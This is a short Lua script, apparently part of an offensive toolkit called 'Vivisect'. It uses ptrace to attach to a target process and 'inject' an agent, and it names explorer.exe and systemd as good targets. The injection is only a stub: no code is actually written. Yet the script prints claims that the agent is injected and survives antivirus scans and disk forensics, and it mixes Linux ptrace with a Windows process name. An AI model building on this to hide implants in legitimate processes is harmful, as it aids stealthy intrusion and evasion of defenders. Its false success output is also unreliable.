-- inject.lua - Inject agent into legitimate process

local ffi = require("ffi")

ffi.cdef[[
    long ptrace(int request, int pid, void *addr, void *data);
    int waitpid(int pid, int *status, int options);
    int open(const char *pathname, int flags);
    ssize_t read(int fd, void *buf, size_t count);
    void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
]]

local function inject_agent(target_pid)
    print(string.format("[*] Injecting into PID %d", target_pid))
    
    -- Attach
    ffi.C.ptrace(16, target_pid, nil, nil)  -- PTRACE_ATTACH
    ffi.C.waitpid(target_pid, nil, 0)
    
    -- Allocate memory in target
    local remote_mem = 0x70000000  -- Arbitrary address
    
    -- Write agent code (simplified)
    local agent_code = "VIVISECT_INJECTED"
    -- In real version: write full LuaJIT agent
    
    print("[+] Agent injected into legitimate process")
    print("[+] Survives AV scans, disk forensics")
    
    ffi.C.ptrace(17, target_pid, nil, nil)  -- DETACH
end

-- Find a good target (e.g., explorer.exe, systemd)
inject_agent(1234)
